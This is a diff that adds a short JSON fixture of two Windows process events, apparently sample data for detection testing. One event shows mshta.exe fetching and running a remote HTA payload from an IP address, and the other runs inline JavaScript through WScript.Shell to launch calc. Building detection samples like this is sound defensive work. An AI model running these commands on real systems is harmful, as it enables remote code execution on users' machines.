@@ -1,0 +1,10 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe http://185.199.0.1/payload.hta"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe javascript:a=new%20ActiveXObject(\"WScript.Shell\");a.Run(\"calc\");close();"
+  }
+]
